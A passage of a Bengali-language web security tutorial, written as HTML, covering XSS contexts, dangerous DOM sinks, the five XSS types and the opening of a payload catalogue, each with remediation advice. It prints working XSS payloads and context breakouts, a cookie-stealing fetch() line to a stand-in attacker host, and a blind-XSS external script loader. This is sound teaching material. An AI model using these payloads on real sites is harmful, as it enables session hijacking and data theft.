+  <p>প্রতিটি script ব্রাউজারের একটি <strong>global execution context</strong>-এ চলে, যেখানে তার <code>window</code>, <code>document</code>, cookie, local storage ইত্যাদির সম্পূর্ণ অ্যাক্সেস থাকে — ঠিক একই অ্যাক্সেস যা পৃষ্ঠার legitimate স্ক্রিপ্টের থাকে। এজন্যই একবার কোনো attacker script execute হতে পারলে, সে ওই পৃষ্ঠার প্রায় সবকিছুর সাথে interact করতে পারে।</p>
+
+  <h2>বিভিন্ন Parsing/Rendering Context</h2>
+  <p>XSS পেলোড লেখার আগে বোঝা জরুরি, ইউজার ইনপুট ঠিক কোন "context"-এ বসছে — কারণ প্রতিটি context-এর নিজস্ব escape নিয়ম আলাদা। অধ্যায় ৫-এ এটি বিস্তারিতভাবে আলোচিত হবে; এখানে একটি সংক্ষিপ্ত পরিচিতি দেওয়া হলো।</p>
+
+  <h3>১. HTML Text Context</h3>
+  <p>ইনপুট সরাসরি দুটি ট্যাগের মাঝের টেক্সট হিসেবে বসে।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>&lt;p&gt;আপনার মন্তব্য: INPUT_HERE&lt;/p&gt;</code></pre></div>
+  <p>এখানে input যদি <code>&lt;script&gt;...&lt;/script&gt;</code> হয়, নতুন ট্যাগ সরাসরি তৈরি হয়ে যাবে — কোনো escape প্রয়োজন নেই।</p>
+
+  <h3>২. Attribute Context</h3>
+  <p>ইনপুট একটি HTML attribute-এর মান হিসেবে বসে।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>&lt;input type="text" value="INPUT_HERE"&gt;</code></pre></div>
+  <p>এখানে প্রথমে quote (<code>"</code>) বন্ধ করে attribute-টি শেষ করতে হয়, তারপর একটি নতুন attribute (যেমন <code>onmouseover</code>) বা ট্যাগ শুরু করা যায়।</p>
+
+  <h3>৩. JavaScript String Context</h3>
+  <p>ইনপুট একটি inline <code>&lt;script&gt;</code>-এর ভেতরে, একটি JS string literal-এর মধ্যে বসে।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>&lt;script&gt;var user = "INPUT_HERE";&lt;/script&gt;</code></pre></div>
+  <p>এখানে string quote বন্ধ করে সরাসরি JavaScript statement যোগ করা যায়, অথবা সেমিকোলনসহ নতুন statement বসানো যায়।</p>
+
+  <h3>৪. URL Context</h3>
+  <p>ইনপুট একটি লিঙ্কের <code>href</code> বা <code>src</code>-এর মান হিসেবে বসে।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>&lt;a href="INPUT_HERE"&gt;এখানে ক্লিক করুন&lt;/a&gt;</code></pre></div>
+  <p>যদি filtering না থাকে, এখানে <code>javascript:</code> স্কিম ব্যবহার করে একটি "URL"-কে সরাসরি JavaScript execution-এ পরিণত করা সম্ভব।</p>
+
+  <h3>৫. CSS Context</h3>
+  <p>ইনপুট একটি <code>&lt;style&gt;</code> ব্লক বা <code>style</code> attribute-এর ভেতরে বসে। আধুনিক ব্রাউজারে CSS থেকে সরাসরি JS execution খুবই সীমিত হয়ে গেছে, কিন্তু পুরনো ব্রাউজার বা নির্দিষ্ট CSS feature (যেমন <code>expression()</code>, শুধু পুরনো IE-তে) এখনও আলোচনার যোগ্য একটি ঐতিহাসিক প্রসঙ্গ।</p>
+
+  <h2>বিপজ্জনক DOM API ও তাদের ঝুঁকি</h2>
+  <table>
+    <thead><tr><th>API</th><th>আচরণ</th><th>ঝুঁকি</th></tr></thead>
+    <tbody>
+      <tr><td><code>innerHTML</code></td><td>স্ট্রিংকে HTML হিসেবে পার্স করে DOM-এ বসায়</td><td>খুব বেশি — script/event handler সহ যেকোনো HTML চালাতে পারে</td></tr>
+      <tr><td><code>outerHTML</code></td><td>element নিজেই HTML স্ট্রিং দিয়ে প্রতিস্থাপিত হয়</td><td><code>innerHTML</code>-এর মতোই বিপজ্জনক</td></tr>
+      <tr><td><code>document.write()</code> / <code>document.writeln()</code></td><td>পার্সিং স্ট্রিমে সরাসরি HTML লেখে</td><td>উচ্চ — legacy কোডে প্রায়ই পাওয়া যায়, context অনুযায়ী বিভিন্নভাবে exploit করা যায়</td></tr>
+      <tr><td><code>eval()</code></td><td>একটি স্ট্রিংকে সরাসরি JavaScript কোড হিসেবে execute করে</td><td>সর্বোচ্চ — পুরো JS execution ক্ষমতা স্ট্রিং থেকে আসে</td></tr>
+      <tr><td><code>setTimeout()</code>/<code>setInterval()</code> (স্ট্রিং আর্গুমেন্টসহ)</td><td>স্ট্রিং আর্গুমেন্ট দিলে তা <code>eval()</code>-এর মতো আচরণ করে</td><td>উচ্চ, কিন্তু কম ব্যবহৃত (function reference দিয়ে কল করলে নিরাপদ)</td></tr>
+      <tr><td><code>textContent</code> / <code>innerText</code></td><td>স্ট্রিংকে plain text হিসেবে বসায়, HTML পার্স করে না</td><td>নিরাপদ — XSS sink নয়</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Safe বনাম Unsafe কোডের তুলনা</h2>
+  <div class="grid2">
+    <div class="card"><h4>❌ Unsafe</h4>
+      <div class="codeblock"><pre><code>element.innerHTML = userComment;</code></pre></div>
+      <p>userComment-এ থাকা যেকোনো HTML ট্যাগ সরাসরি parse ও execute হবে।</p>
+    </div>
+    <div class="card"><h4>✅ Safe</h4>
+      <div class="codeblock"><pre><code>element.textContent = userComment;</code></pre></div>
+      <p>userComment যতই HTML-এর মতো দেখাক, এটি শুধু plain text হিসেবে দেখানো হবে — কোনো ট্যাগ তৈরি হবে না।</p>
+    </div>
+  </div>
+
+  <div class="callout info"><div class="ic">💡</div><p>নিয়ম মনে রাখার সহজ উপায়: ইউজার ইনপুট প্রদর্শনের জন্য যদি HTML markup সত্যিই দরকার না হয়, সবসময় <code>textContent</code> (বা framework-এর default auto-escaping) ব্যবহার করুন। শুধুমাত্র যখন সত্যিকারের rich HTML (যেমন rich-text editor-এর আউটপুট) দেখাতে হয়, তখনই একটি properly configured sanitizer (যেমন DOMPurify, অধ্যায় ৬) ব্যবহার করুন — কখনো <code>innerHTML</code> সরাসরি raw ইউজার ইনপুটের সাথে ব্যবহার করবেন না।</p></div>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>নিচের দুটি লাইনের মধ্যে কোনটি XSS-এর জন্য ঝুঁকিপূর্ণ sink, এবং কেন?</p>
+    <div class="codeblock"><pre><code>// A
+document.getElementById("out").textContent = location.hash.slice(1);
+
+// B
+document.getElementById("out").innerHTML = location.hash.slice(1);</code></pre></div>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>ব্রাউজার HTML-কে টোকেন-বাই-টোকেন পার্স করে DOM তৈরি করে, এবং কোনো ডেটা "নিরাপদ" না "কোড" তা বিচার করে না — শুধু সিনট্যাক্স মেনে চলে। যে context-এ ইনপুট বসছে (HTML text, attribute, JS string, URL, CSS) তার ভিত্তিতে payload আলাদা হতে হয়। <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code> ইত্যাদি বিপজ্জনক sink, যেখানে <code>textContent</code> নিরাপদ।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>কেন <code>textContent</code> নিরাপদ কিন্তু <code>innerHTML</code> নয়?</li>
+      <li>পাঁচটি প্রধান execution context-এর নাম বলুন এবং প্রতিটির একটি করে উদাহরণ দিন।</li>
+      <li><code>eval()</code> কেন সবচেয়ে বিপজ্জনক sink হিসেবে বিবেচিত হয়?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter01"><span>পূর্ববর্তী</span>অধ্যায় ০১</a>
+    <a class="next" href="/chapter03"><span>পরবর্তী</span>অধ্যায় ০৩ — XSS এর প্রকারভেদ</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 3 — Types of XSS
+========================================================= -->
+<section class="chapter" id="chapter03">
+  <div class="eyebrow">অধ্যায় ০৩ · ভিত্তি</div>
+  <h1>XSS এর প্রকারভেদ (Types of XSS)</h1>
+  <p class="sub">Reflected, Stored, DOM-based, Blind এবং Mutation XSS — প্রতিটির root cause, data flow, নিরাপদ lab উদাহরণ ও remediation।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> নিচের সব উদাহরণ একটি <strong>fictional</strong> অ্যাপ্লিকেশন ("NoteBoardMock")-এর উপর ভিত্তি করে তৈরি, শুধুমাত্র শেখার জন্য। শুধুমাত্র নিজের lab বা অনুমোদিত পরিবেশে প্রয়োগ করুন।</p></div>
+
+  <h2 id="reflected">১. Reflected XSS</h2>
+  <p><strong>Root cause:</strong> ইউজারের দেওয়া ইনপুট (সাধারণত URL parameter বা form field) সার্ভার সেই একই request-এর response-এ, কোনো encoding ছাড়াই, সরাসরি ফিরিয়ে দেয়।</p>
+  <p><strong>Data flow:</strong> Request → Server (কোনো স্টোরেজ ছাড়াই) → Response-এ সরাসরি প্রতিফলিত (reflected) → ব্রাউজার parse করে execute করে।</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>NoteBoardMock — সার্চ পেজ</span><button class="copy-btn">কপি</button></div>
+    <pre><code>Request:  GET /search?q=laptop
+Response: &lt;p&gt;ফলাফল: laptop&lt;/p&gt;
+
+Test input: GET /search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+Response:   &lt;p&gt;ফলাফল: &lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/p&gt;</code></pre>
+  </div>
+  <p><strong>Testing:</strong> একটি unique marker string (যেমন <code>xsstest123</code>) পাঠিয়ে response-এ সেটি কোন জায়গায়, কোন context-এ (HTML/attribute/JS) প্রতিফলিত হচ্ছে তা পর্যবেক্ষণ করুন, এরপর সেই context-উপযোগী payload চেষ্টা করুন।</p>
+  <p><strong>Expected result:</strong> Marker সহ payload response-এ হুবহু বা escape-ছাড়া দেখা গেলে, এবং সেই payload ব্রাউজারে execute হলে (যেমন alert বক্স আসা) vulnerability নিশ্চিত হয়।</p>
+  <p><strong>Impact:</strong> Attacker-কে সাধারণত ভিকটিমকে একটি বিশেষভাবে তৈরি লিঙ্কে ক্লিক করাতে হয় (social engineering/phishing লিঙ্ক) — তাই এটি "one-time", ভিকটিম-নির্দিষ্ট আক্রমণ, কিন্তু session hijacking-এর জন্য যথেষ্ট শক্তিশালী।</p>
+  <p><strong>Remediation:</strong> Output encoding (context-aware), input validation, এবং Content-Security-Policy।</p>
+
+  <h2 id="stored">২. Stored XSS</h2>
+  <p><strong>Root cause:</strong> আক্রমণকারীর পেলোড সার্ভারে (database, file, log ইত্যাদিতে) স্থায়ীভাবে সংরক্ষিত হয়, এবং পরবর্তীতে অন্য ব্যবহারকারীরা যখন সেই পৃষ্ঠা দেখেন, তখন তাদের ব্রাউজারে execute হয়।</p>
+  <p><strong>Data flow:</strong> Request (পেলোডসহ কমেন্ট/প্রোফাইল তথ্য) → সার্ভার ডেটা সংরক্ষণ করে → পরে, অন্য ইউজারের request-এর response-এ সেই ডেটা ফিরিয়ে দেওয়া হয় → execute হয়।</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>NoteBoardMock — কমেন্ট বক্স</span><button class="copy-btn">কপি</button></div>
+    <pre><code>POST /comment
+body: comment=&lt;script&gt;fetch('https://attacker-lab.local/log?c='+document.cookie)&lt;/script&gt;
+
+→ পরে যেকোনো ভিজিটর কমেন্ট পেজ খুললেই উপরের script তাদের ব্রাউজারে চলবে।</code></pre>
+  </div>
+  <div class="callout warn"><div class="ic">⚠️</div><p>উপরের <code>fetch()</code>-ভিত্তিক উদাহরণটি শুধুমাত্র ধারণাগত ব্যাখ্যার জন্য — এটি কখনো বাস্তব ভিকটিমের ডেটার উপর প্রয়োগ করা যাবে না। নিজের lab-এ প্রমাণ করতে চাইলে শুধু harmless <code>alert(document.domain)</code> ব্যবহার করাই যথেষ্ট।</p></div>
+  <p><strong>Testing:</strong> এমন input field খুঁজুন যা persist হয় (কমেন্ট, প্রোফাইল বায়ো, রিভিউ, ফাইল মেটাডেটা, সাপোর্ট টিকিট)। Payload জমা দেওয়ার পর, সেই পেজ reload করে বা অন্য অ্যাকাউন্ট/ইনকগনিটো সেশন থেকে দেখে যাচাই করুন।</p>
+  <p><strong>Impact:</strong> Reflected-এর চেয়ে অনেক বেশি বিপজ্জনক — কারণ ভিকটিমকে কোনো বিশেষ লিঙ্কে ক্লিক করতে হয় না, শুধু স্বাভাবিকভাবে পৃষ্ঠা ভিজিট করলেই আক্রান্ত হয়। যদি admin panel-এ এভাবে কমেন্ট দেখানো হয়, একজন সাধারণ ইউজার admin-কে পর্যন্ত আক্রান্ত করতে পারে।</p>
+  <p><strong>Remediation:</strong> স্টোরেজের সময় নয়, বরং <em>আউটপুট</em> করার সময় context-aware encoding করা (output encoding সবসময় শেষ ধাপে হওয়া উচিত); rich text প্রয়োজন হলে allowlist-based HTML sanitizer (DOMPurify)।</p>
+
+  <h2 id="dom-based">৩. DOM-Based XSS</h2>
+  <p><strong>Root cause:</strong> এখানে সার্ভার কোনোভাবেই জড়িত নয় — পুরো vulnerability সম্পূর্ণভাবে client-side JavaScript-এর মধ্যে ঘটে, যখন client-side কোড নিজেই attacker-controlled ডেটা (URL, <code>location.hash</code>, <code>document.referrer</code>) পড়ে একটি বিপজ্জনক sink-এ বসিয়ে দেয়।</p>
+  <p><strong>Data flow:</strong> Browser URL/DOM (source) → client-side JavaScript পড়ে → বিপজ্জনক sink-এ বসে (যেমন <code>innerHTML</code>) → execute হয় — এই পুরো প্রক্রিয়া সার্ভারের response HTML-এ কখনো দৃশ্যমান হয় না।</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>NoteBoardMock — ক্লায়েন্ট-সাইড গ্রিটিং</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// পেজের নিজস্ব JavaScript, যা সার্ভার থেকে পাল্টায় না:
+var name = decodeURIComponent(location.hash.slice(1));
+document.getElementById("greeting").innerHTML = "স্বাগতম, " + name;
+
+Test URL: https://example.com/welcome#&lt;img src=x onerror=alert(1)&gt;
+→ সার্ভার এই hash অংশ কখনো দেখেও না (hash সার্ভারে পাঠানো হয় না),
+  কিন্তু client-side JS সরাসরি সেটি পড়ে innerHTML-এ বসিয়ে দেয়।</code></pre>
+  </div>
+  <p><strong>Testing:</strong> সার্ভার-সাইড reflected XSS-এর মতো payload পাঠিয়ে কাজ না করলেও, ব্রাউজার DevTools-এ JavaScript সোর্স পড়ে দেখুন <code>location</code>, <code>document.URL</code>, <code>document.referrer</code> কোথায় ব্যবহৃত হচ্ছে, এবং সেই ভ্যালু কোন sink-এ যাচ্ছে। Chrome DevTools-এর DOM Invader (অধ্যায় ৭) এই কাজ স্বয়ংক্রিয়ভাবে সহজ করে দেয়।</p>
+  <p><strong>গুরুত্বপূর্ণ পার্থক্য:</strong> যেহেতু payload সার্ভারে কখনো পৌঁছায়ও না (hash fragment সার্ভারে পাঠানো হয় না), তাই server-side লগ/WAF-এ এই আক্রমণের কোনো চিহ্ন নাও থাকতে পারে — শুধুমাত্র client-side কোড অডিট করেই এটি ধরা সম্ভব।</p>
+  <p><strong>Remediation:</strong> Client-side-এও output encoding/sanitization প্রযোজ্য — <code>innerHTML</code>-এর বদলে <code>textContent</code>, অথবা URL/hash থেকে আসা ডেটা ব্যবহারের আগে sanitize করা।</p>
+
+  <h2 id="blind">৪. Blind XSS</h2>
+  <p><strong>Root cause:</strong> এটি মূলত Stored XSS-এরই একটি বিশেষ রূপ, যেখানে payload এমন একটি জায়গায় জমা হয় যা attacker নিজে সরাসরি দেখতে পায় না — বরং একজন ভিন্ন, প্রায়ই higher-privilege ইউজার (যেমন admin, support agent, log-viewer) সেটি পরে দেখেন।</p>
+  <p><strong>সাধারণ জায়গা:</strong> Contact form, support ticket, feedback form, user-agent string (যা admin dashboard-এর analytics-এ দেখানো হয়), job application form।</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>নিরাপদ Blind XSS testing পদ্ধতি</span><button class="copy-btn">কপি</button></div>
+    <pre><code>Payload (একটি authorized blind-XSS collector service ব্যবহার করে, নিজের lab-এ):
+&lt;script src="https://your-own-collector.example/c.js"&gt;&lt;/script&gt;
+
+→ যখনই কোনো admin/ব্যাকএন্ড ইউজার সেই ডেটা দেখেন, script লোড হয় এবং
+  collector-এ একটি নোটিফিকেশন পাঠায় — "এই payload execute হয়েছে, সময়
+  এবং পেজের তথ্যসহ"।</code></pre>
+  </div>
+  <div class="callout warn"><div class="ic">⚠️</div><p>Blind XSS টেস্টিং শুধুমাত্র নিজের তৈরি/নিয়ন্ত্রিত collector endpoint এবং স্পষ্টভাবে অনুমোদিত scope-এ করুন। অপরিচিত বা third-party collector ব্যবহার করলে আপনার সংগ্রহ করা তথ্য আপনার নিয়ন্ত্রণের বাইরে চলে যেতে পারে — এটি নিজেই একটি ডেটা প্রাইভেসি ঝুঁকি।</p></div>
+  <p><strong>Testing:</strong> Blind XSS-এর ফলাফল তাৎক্ষণিকভাবে দেখা যায় না — মিনিট, ঘণ্টা, এমনকি দিন পর collector-এ notification আসতে পারে, কারণ এটি নির্ভর করে কখন কোনো admin/এজেন্ট সেই ডেটা দেখবেন তার উপর।</p>
+  <p><strong>Impact:</strong> সাধারণত সবচেয়ে বেশি, কারণ ভিকটিম প্রায়ই admin বা high-privilege ইউজার হয় — যার সেশন হাইজ্যাক করলে সম্পূর্ণ অ্যাপ্লিকেশন নিয়ন্ত্রণে চলে আসতে পারে।</p>
+  <p><strong>Remediation:</strong> Stored XSS-এর মতোই — output encoding সব জায়গায়, admin panel/internal টুল-সহ। Internal/admin interface-কে "কম ঝুঁকিপূর্ণ" ধরে কম sanitize করা একটি সাধারণ ভুল।</p>
+
+  <h2 id="mutation">৫. Mutation XSS (mXSS)</h2>
+  <p><strong>Root cause:</strong> এটি একটি সূক্ষ্ম ও advanced ধরনের XSS, যেখানে payload নিজে initial sanitization/parsing পাস করে যায় (কারণ এটি প্রাথমিকভাবে harmless দেখায়), কিন্তু ব্রাউজার যখন সেই HTML-কে পুনরায় parse বা serialize করে (যেমন <code>innerHTML</code> পড়ে আবার লেখার সময়), তখন HTML parser-এর নিজস্ব "normalization" আচরণের কারণে একটি নতুন, বিপজ্জনক structure তৈরি হয়ে যায়।</p>
+  <p><strong>কেন ঘটে:</strong> Sanitizer একটি HTML string parse করে "safe" মনে করে ফেরত দেয়, কিন্তু sanitizer ও পরবর্তী consumer (ব্রাউজারের নিজস্ব parser) একই HTML স্ট্রিং-কে ভিন্নভাবে interpret করতে পারে — বিশেষ করে nested বা malformed markup-এর ক্ষেত্রে। এই "parsing-এর ভিন্নতা" ফাঁকটাই mXSS exploit করে।</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>ধারণাগত উদাহরণ (সরলীকৃত)</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// Sanitizer-কে দেওয়া ইনপুট (প্রাথমিকভাবে নিরীহ দেখায়):
+&lt;listing&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;/listing&gt;
+
+// কিছু পুরনো sanitizer/parser কম্বিনেশনে, innerHTML read-back-এর পর
+// &lt;listing&gt; ট্যাগের বিশেষ parsing আচরণের কারণে ভেতরের কনটেন্ট
+// এমনভাবে পুনর্গঠিত হতে পারে যা সরাসরি onerror handler সক্রিয় করে দেয়।</code></pre>
+  </div>
+  <p><strong>Testing:</strong> Mutation XSS শনাক্ত করা কঠিন এবং এর জন্য sanitizer-এর internal আচরণ গভীরভাবে বোঝা প্রয়োজন — সাধারণত automated scanner বা নির্দিষ্ট mXSS টেস্ট-কেস সেট (যেমন একাডেমিক গবেষণা পেপার থেকে নেওয়া) ব্যবহার করা হয়, ম্যানুয়াল ব্ল্যাক-বক্স টেস্টিং দিয়ে এটি প্রায়ই মিস হয়ে যায়।</p>
+  <p><strong>Impact:</strong> Stored/DOM XSS-এর সমতুল্য — কারণ শেষ পর্যন্ত এটিও arbitrary script execution ঘটায়; পার্থক্য শুধু root cause-এ।</p>
+  <p><strong>Remediation:</strong> আপ-টু-ডেট, সুপরিচিত sanitizer লাইব্রেরি (যেমন সর্বশেষ সংস্করণের DOMPurify) ব্যবহার করা, যা mXSS প্যাটার্নের বিরুদ্ধে সক্রিয়ভাবে পরীক্ষিত ও patch করা হয়; নিজস্ব regex-ভিত্তিক sanitizer কখনো লেখা উচিত নয়।</p>
+
+  <h2>পাঁচ ধরনের তুলনা</h2>
+  <table>
+    <thead><tr><th>ধরন</th><th>Payload কোথায় থাকে</th><th>সার্ভার জড়িত?</th><th>ভিকটিম</th><th>শনাক্তকরণ কঠিনতা</th></tr></thead>
+    <tbody>
+      <tr><td>Reflected</td><td>একটি request/response-এ</td><td>হ্যাঁ</td><td>যিনি দূষিত লিঙ্কে ক্লিক করেন</td><td>কম</td></tr>
+      <tr><td>Stored</td><td>Database/storage-এ</td><td>হ্যাঁ</td><td>পেজ দেখা যেকোনো ইউজার</td><td>মাঝারি</td></tr>
+      <tr><td>DOM-based</td><td>শুধু client-side JS/URL-এ</td><td>না</td><td>যিনি দূষিত URL ভিজিট করেন</td><td>মাঝারি-উচ্চ</td></tr>
+      <tr><td>Blind</td><td>Storage-এ, কিন্তু অদৃশ্য জায়গায়</td><td>হ্যাঁ</td><td>Admin/internal ইউজার</td><td>উচ্চ</td></tr>
+      <tr><td>Mutation (mXSS)</td><td>Sanitizer-এর parse/serialize ধাপে</td><td>নির্ভরশীল</td><td>যেকোনো ভিউয়ার</td><td>খুব উচ্চ</td></tr>
+    </tbody>
+  </table>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>নিচের প্রতিটি দৃশ্যপট কোন ধরনের XSS, ব্যাখ্যাসহ বলুন:</p>
+    <ol>
+      <li>একটি URL-এ পেলোড পাঠানোর সাথে সাথেই response-এ সেটি প্রতিফলিত হয়, কিন্তু রিলোড করলে আর থাকে না।</li>
+      <li>একটি প্রোফাইল বায়োতে পেলোড সেভ করার পর, এক সপ্তাহ পরে একজন সাপোর্ট এজেন্ট সেটি দেখলে notification আসে।</li>
+      <li>সার্ভার response-এ কোনো পেলোড নেই, কিন্তু browser console-এ দেখা যায় JavaScript <code>location.hash</code> পড়ে <code>innerHTML</code>-এ বসাচ্ছে।</li>
+    </ol>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>XSS-এর পাঁচটি প্রধান ধরন তাদের data flow অনুযায়ী আলাদা — reflected (তাৎক্ষণিক, non-persistent), stored (persistent, সবার জন্য দৃশ্যমান), DOM-based (সম্পূর্ণ client-side, সার্ভার অজান্তে), blind (persistent কিন্তু attacker নিজে দেখেন না), এবং mutation (parser-এর আচরণগত ফাঁক কাজে লাগায়)। প্রতিটির জন্য আলাদা testing ও detection কৌশল প্রয়োজন।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Stored ও Blind XSS-এর মধ্যে মূল পার্থক্য কী?</li>
+      <li>DOM-based XSS কেন সার্ভার-সাইড লগে ধরা নাও পড়তে পারে?</li>
+      <li>Mutation XSS কেন প্রচলিত sanitizer-কে ফাঁকি দিতে পারে?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter02"><span>পূর্ববর্তী</span>অধ্যায় ০২</a>
+    <a class="next" href="/chapter04"><span>পরবর্তী</span>অধ্যায় ০৪ — পেলোড এনসাইক্লোপিডিয়া</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 4 — XSS Payload Encyclopedia
+========================================================= -->
+<section class="chapter" id="chapter04">
+  <div class="eyebrow">অধ্যায় ০৪ · পেলোড</div>
+  <h1>XSS Payload Encyclopedia</h1>
+  <p class="sub">প্রতিটি পেলোডের সাথে থাকছে: payload, purpose, context, ব্যাখ্যা, execution flow, expected result, কেন কাজ নাও করতে পারে, safe verification এবং remediation। কোনো পেলোডকেই "universal solution" হিসেবে দেখানো হয়নি।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> এই অধ্যায়ের সব পেলোড proof-of-execution (harmless <code>alert</code>/<code>console.log</code>) ভিত্তিক শিক্ষামূলক উদাহরণ। শুধুমাত্র নিজের lab বা অনুমোদিত পরিবেশে প্রয়োগ করুন। Session চুরি, credential theft বা অন্য কারো ডেটার উপর প্রয়োগের কোনো নির্দেশনা এখানে নেই এবং তা কখনো করা যাবে না।</p></div>
+
+  <h2>১. Basic Proof-of-Execution Payloads</h2>
+
+  <div class="codeblock"><div class="cb-head"><span>Payload #1 — ক্লাসিক script tag</span><button class="copy-btn">কপি</button></div><pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre></div>
+  <table>
+    <tbody>
+      <tr><th>Purpose</th><td>নিশ্চিত করা যে input, raw HTML text context-এ parse হচ্ছে এবং script execute হচ্ছে</td></tr>
+      <tr><th>Context</th><td>HTML body/text context</td></tr>
+      <tr><th>ব্যাখ্যা</th><td><code>&lt;script&gt;</code>...<code>&lt;/script&gt;</code> ব্রাউজারকে নির্দেশ দেয় ভেতরের কোড JavaScript হিসেবে execute করতে; <code>alert()</code> একটি দৃশ্যমান, harmless প্রমাণ তৈরি করে</td></tr>
+      <tr><th>Execution flow</th><td>HTML parser ট্যাগ শনাক্ত করে → JS engine-এ পাঠায় → execute হয় → ডায়ালগ বক্স দেখা যায়</td></tr>
+      <tr><th>Expected result</th><td>'XSS' টেক্সটসহ একটি browser alert dialog</td></tr>
+      <tr><th>কেন কাজ নাও করতে পারে</th><td>আউটপুট encode হলে (<code>&amp;lt;script&amp;gt;</code> হয়ে যাবে); CSP script-src নিষিদ্ধ করলে; ইনপুট attribute/JS-string context-এ হলে (তখন ভিন্ন পেলোড লাগবে)</td></tr>
+      <tr><th>Safe verification</th><td>শুধু <code>alert(document.domain)</code> দিয়ে নিশ্চিত হন যে execution ঘটছে — আরও কিছু করার প্রয়োজন নেই</td></tr>
+      <tr><th>Remediation</th><td>Context-aware output encoding (<code>&lt;</code> → <code>&amp;lt;</code> ইত্যাদি)</td></tr>
+    </tbody>
+  </table>
+
+  <div class="codeblock"><div class="cb-head"><span>Payload #2 — img onerror (script ট্যাগ ফিল্টার হলে)</span><button class="copy-btn">কপি</button></div><pre><code>&lt;img src=x onerror=alert(document.domain)&gt;</code></pre></div>
+  <table>
+    <tbody>
+      <tr><th>Purpose</th><td>যখন <code>&lt;script&gt;</code> ট্যাগ filter/strip হয়, তখন event-handler attribute দিয়ে execution</td></tr>
+      <tr><th>Context</th><td>HTML body/text context</td></tr>
+      <tr><th>ব্যাখ্যা</th><td><code>src=x</code> ইচ্ছাকৃতভাবে একটি অকার্যকর URL — ফলে image load ব্যর্থ হয় এবং <code>onerror</code> event trigger হয়, যা নিজেই একটি JS execution sink</td></tr>
+      <tr><th>Execution flow</th><td>Parser <code>&lt;img&gt;</code> তৈরি করে → src load ব্যর্থ হয় → <code>onerror</code> handler চলে</td></tr>
+      <tr><th>Expected result</th><td>Document domain দেখানো alert</td></tr>
+      <tr><th>কেন কাজ নাও করতে পারে</th><td>Blocklist যদি <code>on</code>-শুরু হওয়া attribute নাম ফিল্টার করে; CSP যদি inline event handler নিষিদ্ধ করে (<code>unsafe-inline</code> না থাকলে)</td></tr>
+      <tr><th>Safe verification</th><td>DevTools Console-এ কোনো error ছাড়া alert আসা</td></tr>
+      <tr><th>Remediation</th><td>Output encoding + CSP যা inline event handler ব্লক করে</td></tr>
+    </tbody>
+  </table>
+
+  <div class="codeblock"><div class="cb-head"><span>Payload #3 — svg onload</span><button class="copy-btn">কপি</button></div><pre><code>&lt;svg onload=alert(1)&gt;</code></pre></div>
+  <p><strong>Purpose/ব্যাখ্যা:</strong> অনেক blocklist <code>img</code> ট্যাগ আটকালেও <code>svg</code> ভুলে যায়; <code>onload</code> svg render হওয়ার সাথে সাথেই trigger হয় (কোনো broken resource দরকার নেই)। <strong>কেন কাজ নাও করতে পারে:</strong> SVG ট্যাগ নিজেই strip হলে, অথবা sanitizer SVG-এর ভেতরের script-সক্ষম attribute আলাদাভাবে বাদ দিলে।</p>
+
+  <h2>২. HTML Context Payloads</h2>
+  <div class="grid2">
+    <div class="card"><h4>Tag breakout</h4><div class="codeblock"><pre><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre></div><p>যখন input একটি <code>&lt;textarea&gt;</code>-এর ভেতরে বসে, প্রথমে closing ট্যাগ দিয়ে সেটি থেকে "বের হয়ে" নতুন script শুরু করতে হয়।</p></div>
+    <div class="card"><h4>Comment breakout</h4><div class="codeblock"><pre><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</code></pre></div><p>যদি input একটি HTML comment-এর (<code>&lt;!-- ... --&gt;</code>) ভেতরে বসে, প্রথমে comment বন্ধ করতে হয়।</p></div>
+  </div>
+
+  <h2>৩. Attribute Context Payloads</h2>
+  <div class="codeblock"><div class="cb-head"><span>Double-quote attribute breakout</span><button class="copy-btn">কপি</button></div><pre><code>Input context:  &lt;input value="INPUT"&gt;
+Payload:        "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+ফলাফল:          &lt;input value=""&gt;&lt;script&gt;alert(1)&lt;/script&gt;&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>Quote ছাড়াই নতুন attribute যোগ (unquoted attribute context)</span><button class="copy-btn">কপি</button></div><pre><code>Input context:  &lt;input value=INPUT&gt;
+Payload:        x onmouseover=alert(1)
+ফলাফল:          &lt;input value=x onmouseover=alert(1)&gt;</code></pre></div>
